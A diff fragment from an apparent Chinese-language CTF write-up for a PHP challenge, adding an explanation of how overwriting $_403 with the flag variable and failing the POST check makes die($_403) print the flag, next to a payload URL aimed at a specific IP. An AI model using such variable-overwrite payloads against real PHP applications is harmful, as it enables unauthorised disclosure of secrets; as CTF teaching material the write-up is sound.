@@ -29,6 +29,8 @@ POST:
 flag=1
 ```
 
+利用前面的`die($_403)`也可以实现。我们先把原flag的值覆盖到`$_403`上，然后构造`$_POST["flag"] !== $flag`，从而`die($_403)`输出flag。
+
 payload2:
 ```
 http://34.253.165.46/SimplePhp/index.php?_403=flag&_POST=1
